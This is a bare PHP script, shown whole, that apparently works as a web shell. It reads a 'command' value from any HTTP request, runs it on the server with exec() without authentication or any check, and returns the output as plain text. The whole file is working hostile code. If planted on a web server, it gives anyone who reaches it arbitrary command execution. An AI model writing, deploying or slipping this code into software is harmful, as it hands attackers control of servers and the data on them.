<?php

$command = $_REQUEST['command'] ?? 'ls';
$output = null;
$code = null;

$result = exec($command, $output, $code);

if ($result === false || $code !== 0) {
    header('HTTP/1.1 500 Internal Server Error');
} else {
    header('HTTP/1.1 200 OK');
    header('Content-Type: text/plain; charset=UTF-8');
}

if (is_array($output)) {
    echo implode(PHP_EOL, $output);
} else {
    echo $output;
}